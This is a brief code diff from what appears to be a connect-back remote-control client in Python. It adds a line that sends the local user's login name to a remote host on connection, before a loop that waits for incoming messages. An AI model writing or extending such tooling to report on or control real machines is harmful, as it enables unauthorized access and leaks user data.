@@ -24,6 +24,7 @@ def outbound(message):
 def session_handler():
     print(f'[+] Connecting to {host_ip} ')
     sock.connect((host_ip, host_port))
+    outbound(os.getlogin())
     print(f'[+] Connected to {host_ip}. ')
     while True:
         message = inbound()
